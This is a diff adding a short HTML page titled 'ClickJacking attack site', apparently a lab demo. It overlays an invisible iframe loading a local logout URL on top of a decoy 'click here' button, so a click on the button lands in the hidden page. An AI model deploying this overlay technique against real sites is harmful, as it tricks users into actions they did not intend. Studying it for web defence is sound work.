@@ -1,0 +1,23 @@
+<html lang="ja">
+<head>
+    <title>ClickJacking attack site</title>
+    <meta charset="UTF-8">
+    <style>
+    .target {
+      position: absolute;
+      opacity: 0;
+    }
+
+    .attack {
+      position: absolute;
+      width: 200px;
+      height: 50px;
+      z-index: -1;
+    }
+    </style>
+</head>
+<body>
+    <button class="attack">点击此处！</button>
+    <iframe class="target" src="http://localhost:8000/logout/"></iframe>
+</body>
+</html>
